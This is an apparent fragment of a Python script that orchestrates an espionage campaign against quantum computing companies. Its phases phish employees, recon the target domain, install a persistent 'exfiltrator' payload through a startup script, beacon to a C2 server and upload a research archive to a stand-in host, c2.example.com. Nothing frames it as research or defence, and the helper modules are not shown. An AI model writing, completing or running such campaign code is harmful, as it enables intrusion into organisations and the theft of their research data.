...
def main():
    """
    Main function to run the quantum_computing_campaign campaign.
    """
    print(f"[*] Starting quantum_computing_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("quantum_computing_companies_employees.txt")
    run_tool("apt_web_recon.js", "--target quantum_computing_companies.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/quantum_computing_research_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-QUANTUM_COMPUTING_COMPANIES-01")
    ...
    exfiltration.exfiltrate_data("quantum_computing_research/quantum_computing_research.zip", "https://c2.example.com/upload")
    run_tool("payloads/quantum_computing_research_exfiltrator.py")
